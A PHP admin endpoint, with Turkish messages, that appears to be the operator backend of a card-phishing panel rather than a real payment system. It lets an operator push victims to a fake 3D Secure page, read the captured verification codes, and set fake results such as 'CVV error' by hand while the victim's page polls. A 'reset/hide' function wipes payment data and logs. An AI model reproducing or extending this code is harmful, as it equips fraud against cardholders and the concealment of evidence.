<?php
require_once 'config.php';
require_admin();

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

header('Content-Type: application/json');

$is_ajax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
if (!$is_ajax && !isset($_GET['debug'])) {
    echo json_encode(['success'=>false,'message'=>'Doğrudan erişime izin verilmiyor.']);
    exit;
}

error_reporting(E_ALL);
ini_set('display_errors', 1);

$action = $_REQUEST['action'] ?? '';
$response = ['success'=>false,'message'=>'İşlem belirtilmedi.','action'=>$action];

switch ($action) {
    case 'send_3d':
        handleSend3D();
        break;
    case 'update_status':
        handleUpdateStatus();
        break;
    case 'delete_log':
        handleDeleteLog();
        break;
    case 'check_3d_status':
        handle3DStatusCheck();
        break;
    case 'check_payment_status':
        handleCheckPaymentStatus();
        break;
    case 'ping_session':
        $order_id = intval($_REQUEST['order_id'] ?? 0);
        if ($order_id) {
            $stmt = $pdo->prepare('UPDATE customer_session SET last_ping = NOW() WHERE order_id = ?');
            $stmt->execute([$order_id]);
        }
        echo json_encode(['success'=>true]);
        exit;
    default:
        $response['message'] = 'Geçersiz işlem.';
}

echo json_encode($response, JSON_PRETTY_PRINT);
exit;

function handleCheckPaymentStatus() {
    global $pdo;

    $order_id = intval($_REQUEST['order_id'] ?? 0);
    if (!$order_id) {
        echo json_encode(['success'=>false,'message'=>'Geçersiz sipariş ID.']);
        exit;
    }

    try {
        // First look for redirect/message in customer_session
        $stmt = $pdo->prepare('SELECT redirect_to, payment_message FROM customer_session WHERE order_id = ?');
        $stmt->execute([$order_id]);
        $session = $stmt->fetch(PDO::FETCH_ASSOC);

        // Get 3D code if available
        $stmt = $pdo->prepare('SELECT code FROM threeds WHERE order_id = ? AND status = "verified" ORDER BY verified_at DESC LIMIT 1');
        $stmt->execute([$order_id]);
        $code = $stmt->fetchColumn();

        // Always fetch current payment_status from orders table
        $stmt = $pdo->prepare('SELECT payment_status FROM orders WHERE id = ?');
        $stmt->execute([$order_id]);
        $status = $stmt->fetchColumn() ?: 'pending';

        echo json_encode([
            'success'      => true,
            'status'       => $session['payment_message'] ?? $status,
            'redirect_url' => $session['redirect_to'] ?? null,
            'code'         => $code
        ]);
    } catch (PDOException $e) {
        echo json_encode(['success'=>false,'message'=>'DB hatası: '.$e->getMessage()]);
    }
    exit;
}

/**
 * 3D Secure doğrulama işlemini başlatma
 */
function handleSend3D() {
    global $pdo, $response;

    $order_id = isset($_REQUEST['order_id']) ? intval($_REQUEST['order_id']) : 0;
    if (!$order_id) {
        $response['success'] = false;
        $response['message'] = 'Geçersiz sipariş ID.';
        return;
    }

    try {
        // Siparişi kontrol et
        $stmt = $pdo->prepare('SELECT * FROM orders WHERE id = ?');
        $stmt->execute([$order_id]);
        $order = $stmt->fetch();

        if (!$order) {
            $response['success'] = false;
            $response['message'] = 'Sipariş bulunamadı.';
            return;
        }

        // Siparişi 3D bekleme durumuna geçir
        $stmt = $pdo->prepare('UPDATE orders SET payment_status = ? WHERE id = ?');
        $stmt->execute(['3d_pending', $order_id]);

        // Payment log kaydı
        $stmt = $pdo->prepare('INSERT INTO payment_logs (order_id, transaction_type, amount, status, error_message)
                               VALUES (?, ?, ?, ?, ?)');
        $stmt->execute([
            $order_id,
            '3d_secure',
            $order['total'],
            'pending',
            '3D Secure doğrulama bekleniyor'
        ]);

        // Önce varolan 3D kaydını kontrol et
        $stmt = $pdo->prepare('SELECT id FROM threeds WHERE order_id = ? AND status = "pending"');
        $stmt->execute([$order_id]);
        $existing_3d = $stmt->fetch();
        
        if ($existing_3d) {
            // Var olan kaydı güncelle
            $stmt = $pdo->prepare('UPDATE threeds SET created_at = NOW() WHERE id = ?');
            $stmt->execute([$existing_3d['id']]);
            $threed_id = $existing_3d['id'];
        } else {
            // Yeni 3D kaydı oluştur
            $stmt = $pdo->prepare('INSERT INTO threeds (order_id, status, created_at) VALUES (?, ?, NOW())');
            $stmt->execute([$order_id, 'pending']);
            $threed_id = $pdo->lastInsertId();
        }

        // 3D Secure yönlendirme URL'si
        $redirect_url = "3dsecure.php?t=" . $threed_id;
        $_SESSION['current_3d_url'] = $redirect_url;

        // Müşteri tarafına da redirect bilgisi saklamak
        try {
            // Müşteri session tablosu var ise orada redirect_to alanını güncelle
            $stmt = $pdo->prepare('SELECT id FROM customer_session WHERE order_id = ?');
            $stmt->execute([$order_id]);
            $session = $stmt->fetch();

            if ($session) {
                $stmt = $pdo->prepare('UPDATE customer_session SET redirect_to = ? WHERE order_id = ?');
                $stmt->execute([$redirect_url, $order_id]);
            } else {
                // Yoksa yeni kayıt
                $stmt = $pdo->prepare('INSERT INTO customer_session (order_id, session_id, redirect_to) VALUES (?, ?, ?)');
                $stmt->execute([$order_id, session_id(), $redirect_url]);
            }
        } catch (Exception $ex) {
            // Session tablosu yoksa hata verse bile, 3D işlemi yine de başlatıldı
            $response['warning'] = 'customer_session tablosu güncellenemedi: ' . $ex->getMessage();
        }

        // Başarılı yanıt
        $response['success'] = true;
        $response['message'] = '3D Secure doğrulama başlatıldı.';
        $response['redirect_url'] = $redirect_url;
        $response['threed_id'] = $threed_id;

    } catch (PDOException $e) {
        $response['success'] = false;
        $response['message'] = 'Veritabanı hatası: ' . $e->getMessage();
    }
}

/**
 * Ödeme durumunu güncelleme
 */
function handleUpdateStatus() {
    global $pdo, $response;

    $order_id = isset($_REQUEST['order_id']) ? intval($_REQUEST['order_id']) : 0;
    $status   = isset($_REQUEST['status'])   ? $_REQUEST['status'] : '';

    if (!$order_id || !$status) {
        $response['success'] = false;
        $response['message'] = 'Geçersiz parametreler.';
        return;
    }

    // Duruma göre mesaj belirle
    $status_message = '';
    $payment_status = '';
    $processing_url = 'payment_processing.php?order_id=' . $order_id;

    switch ($status) {
        case 'cvv_error':
            $status_message = 'CVV kodu hatalı';
            $payment_status = 'failed';
            break;
        case 'card_error':
            $status_message = 'Kart bilgileri hatalı';
            $payment_status = 'failed';
            break;
        case 'insufficient_funds':
            $status_message = 'Yetersiz bakiye';
            $payment_status = 'failed';
            break;
        case 'GREAT':
            $status_message = 'İşlem başarılı (GREAT)';
            $payment_status = 'GREAT';
            break;
        default:
            // Özel durumlarınız varsa ekleyebilirsiniz
            $status_message = $status;
            $payment_status = $status;
    }

    try {
        // Siparişi güncelle
        $stmt = $pdo->prepare('UPDATE orders SET payment_status = ? WHERE id = ?');
        $stmt->execute([$payment_status, $order_id]);

        // Payment log kaydı
        $stmt = $pdo->prepare('INSERT INTO payment_logs (order_id, transaction_type, status, error_message)
                               VALUES (?, ?, ?, ?)');
        $stmt->execute([
            $order_id,
            'payment_update',
            $payment_status,
            $status_message
        ]);

        // Müşteri tarafına mesaj ve yönlendirme
        try {
            // Customer session tablosu var mı kontrol et
            $stmt = $pdo->prepare('SELECT id FROM customer_session WHERE order_id = ?');
            $stmt->execute([$order_id]);
            $session = $stmt->fetch();

            if ($session) {
                if ($payment_status == 'failed') {
                    // Başarısız ödeme mesajı ve payment_processing sayfasına yönlendir
                    $stmt = $pdo->prepare('UPDATE customer_session SET 
                        payment_message = ?, 
                        redirect_to = ? 
                        WHERE order_id = ?');
                    $stmt->execute([$status_message, $processing_url, $order_id]);
                } elseif ($payment_status == 'GREAT') {
                    // Başarılı ödeme ve payment_processing sayfasına yönlendir
                    $stmt = $pdo->prepare('UPDATE customer_session SET 
                        payment_message = ?, 
                        redirect_to = ? 
                        WHERE order_id = ?');
                    $stmt->execute([$status_message, $processing_url, $order_id]);
                }
            } else {
                // Session kaydı yoksa oluştur
                $stmt = $pdo->prepare('INSERT INTO customer_session 
                    (order_id, session_id, payment_message, redirect_to) 
                    VALUES (?, ?, ?, ?)');
                $stmt->execute([
                    $order_id, 
                    session_id(), 
                    $status_message, 
                    $processing_url
                ]);
            }
        } catch (Exception $ex) {
            $response['warning'] = 'customer_session güncellenemedi: ' . $ex->getMessage();
        }

        $response['success'] = true;
        $response['message'] = 'Ödeme durumu güncellendi: ' . $status_message;

    } catch (PDOException $e) {
        $response['success'] = false;
        $response['message'] = 'Veritabanı hatası: ' . $e->getMessage();
    }
}

/**
 * İşlem loglarını silme ve sistemi sıfırlama/gizleme
 */
function handleDeleteLog() {
    global $pdo, $response;

    $order_id = isset($_REQUEST['order_id']) ? intval($_REQUEST['order_id']) : 0;
    $reset_all = isset($_REQUEST['reset_all']) ? (bool)$_REQUEST['reset_all'] : true; // Varsayılan olarak true
    
    if (!$order_id) {
        $response['success'] = false;
        $response['message'] = 'Geçersiz sipariş ID.';
        return;
    }

    try {
        // Ödeme loglarını sil
        $stmt = $pdo->prepare('DELETE FROM payment_logs WHERE order_id = ?');
        $stmt->execute([$order_id]);

        // 3D kayıtlarını sil
        $stmt = $pdo->prepare('DELETE FROM threeds WHERE order_id = ?');
        $stmt->execute([$order_id]);
        
        // Customer session kayıtlarını sil
        $stmt = $pdo->prepare('DELETE FROM customer_session WHERE order_id = ?');
        $stmt->execute([$order_id]);

        // Tüm sistem sıfırlanacak mı?
        if ($reset_all) {
            // Sipariş durumunu "archived" olarak işaretle
            // Bu sayede dashboard sorgusunda görünmeyecek
            $stmt = $pdo->prepare('UPDATE orders SET 
                payment_status = "archived", 
                status = "archived"
                WHERE id = ?');
            $stmt->execute([$order_id]);
            
            // Ödeme verilerini temizle
            $stmt = $pdo->prepare('DELETE FROM payment_data WHERE order_id = ?');
            $stmt->execute([$order_id]);
            
            // Sipariş tamamen silinsin mi?
            $delete_completely = isset($_REQUEST['delete_completely']) ? (bool)$_REQUEST['delete_completely'] : false;
            if ($delete_completely) {
                // Siparişi tamamen sil
                $stmt = $pdo->prepare('DELETE FROM orders WHERE id = ?');
                $stmt->execute([$order_id]);
                $response['message'] = 'Sipariş ve tüm ilgili veriler tamamen silindi.';
            } else {
                $response['message'] = 'İşlem arşivlendi. Tüm loglar ve veriler silindi.';
            }
            
            $response['success'] = true;
        } else {
            $response['success'] = true;
            $response['message'] = 'İşlem logları silindi.';
        }

    } catch (PDOException $e) {
        $response['success'] = false;
        $response['message'] = 'Veritabanı hatası: ' . $e->getMessage();
    }
}

/**
 * 3D durumlarını kontrol etme
 */
function handle3DStatusCheck() {
    global $pdo, $response;

    try {
        // 3D bekleyen veya doğrulanmış (verified) işlemleri al
        $stmt = $pdo->prepare('
            SELECT t.*, o.id as order_id
            FROM threeds t
            JOIN orders o ON t.order_id = o.id
            WHERE t.status IN ("pending", "verified")
            ORDER BY t.created_at DESC
        ');
        $stmt->execute();
        $pending = $stmt->fetchAll(PDO::FETCH_ASSOC);

        $response['success'] = true;
        $response['pending_transactions'] = $pending;

    } catch (PDOException $e) {
        $response['success'] = false;
        $response['message'] = 'Veritabanı hatası: ' . $e->getMessage();
    }
}